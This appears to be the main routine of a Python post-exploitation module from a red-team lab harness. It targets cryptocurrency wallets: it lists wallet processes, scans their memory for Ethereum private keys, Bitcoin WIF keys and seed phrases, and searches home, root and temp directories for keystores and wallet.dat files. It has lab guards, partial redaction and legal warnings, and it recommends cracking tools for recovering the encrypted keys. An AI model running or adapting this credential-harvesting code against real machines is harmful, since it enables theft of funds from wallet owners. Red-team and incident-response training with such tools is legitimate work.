# ─── Main ─────────────────────────────────────────────────────────────────────
def main() -> None:
    _check_lab_guard()
    safe_mode = _check_safe_mode()

    # ─── Phase 1 : identify wallet processes ──────────────────────────────
    wallet_procs = list_wallet_processes()
    process_scanned = (
        f"pid={wallet_procs[0]['pid']} comm={wallet_procs[0]['comm']}"
        if wallet_procs else "none"
    )

    # ─── Phase 2 : scan memory of each wallet process ─────────────────────
    memory_scans = []
    all_keys: list[dict] = []
    for p in wallet_procs[:3]:  # cap to first 3 wallet procs (timeout protection)
        scan = scan_process_memory(p["pid"])
        memory_scans.append({
            "pid": p["pid"],
            "comm": p["comm"],
            "cmdline_redacted": p["cmdline_redacted"],
            "scan": scan,
        })
        for k in scan["keys_found"]["eth"]:
            all_keys.append({"type": "eth_privkey", "pid": p["pid"], **k})
        for k in scan["keys_found"]["btc"]:
            all_keys.append({"type": "btc_wif", "pid": p["pid"], **k})
        for k in scan["keys_found"]["mnemonic"]:
            all_keys.append({"type": "mnemonic", "pid": p["pid"], **k})

    # ─── Phase 3 : scan filesystem for keystore / wallet.dat ──────────────
    # Optional CLI arg : wallet_extract.py [extra_search_dir1] [extra_search_dir2] ...
    # Default search dirs are appended to any CLI-provided dirs.
    extra_dirs = tuple(sys.argv[1:]) if len(sys.argv) > 1 else ()
    # Filter to existing dirs
    extra_dirs = tuple(d for d in extra_dirs if os.path.isdir(d))
    default_dirs = ("/root", "/home", "/tmp", "/var/lib", "/data", "/opt")
    # CLI dirs first (targeted scan), then defaults (broader)
    search_dirs = extra_dirs + default_dirs
    fs_scan = scan_filesystem_for_wallet_files(search_dirs=search_dirs)

    # Keystores are a key source : extract address (PUBLIC) but redact ciphertext
    for ks in fs_scan["keystores_found"]:
        all_keys.append({
            "type": "keystore",
            "address": ks["address"],
            "kdf": ks["kdf"],
            "cipher": ks["cipher"],
            "path": ks["path"],
            "preview_redacted": f"path={ks['path']} addr={ks['address'][:8]}***",
        })

    for wd in fs_scan["wallet_dat_found"]:
        all_keys.append({
            "type": "wallet_dat",
            "path": wd["path"],
            "preview_redacted": f"path={wd['path']} ({wd['size_bytes']} bytes)",
        })

    # ─── Synthesize summary ───────────────────────────────────────────────
    key_types_present = sorted({k["type"] for k in all_keys})
    keys_redacted = [
        k.get("preview_redacted", "***") for k in all_keys[:20]  # cap to 20
    ]
    wallet_files_found = (
        [ks["path"] for ks in fs_scan["keystores_found"]]
        + [wd["path"] for wd in fs_scan["wallet_dat_found"]]
    )

    report = {
        "module": MODULE_NAME,
        "harness_version": HARNESS_VERSION,
        "sector": "crypto",
        "safe_mode": safe_mode,
        "lab": os.environ.get("LAB", "?"),
        "seed": SEED,
        "post_exploitation": True,
        "regulations": list(get_sector_config().get("regulations", [])),
        "results": {
            "wallet_processes_found": wallet_procs,
            "memory_scans": memory_scans,
            "filesystem_scan": fs_scan,
        },
        "summary": {
            "keys_found": len(all_keys),
            "key_types": key_types_present,
            "keys_redacted": keys_redacted,
            "wallet_files_found": wallet_files_found,
            "process_scanned": process_scanned,
        },
        "security_note": (
            "CRITICAL: all private keys redacted to first 8 chars + ***. "
            "No plaintext key material exfiltrated via this module. "
            "Operator must use dedicated tools (e.g. btcrecover for wallet.dat, "
            "ethereum keystore cracker for v3 keystores) to recover encrypted "
            "key material — separate step, separate authorization."
        ),
        "legal_note": (
            "Module post-exploitation — exécution hors lab isolé = crime "
            "(Art. 311-1 vol, Art. 323-1 accès frauduleux). "
            "Usage légitime : audit de post-compromission, IR training, red team."
        ),
        "sector_base_loaded": _HAS_SECTOR_BASE,
    }
    print(json.dumps(report, indent=2, default=str))


if __name__ == "__main__":
    main()
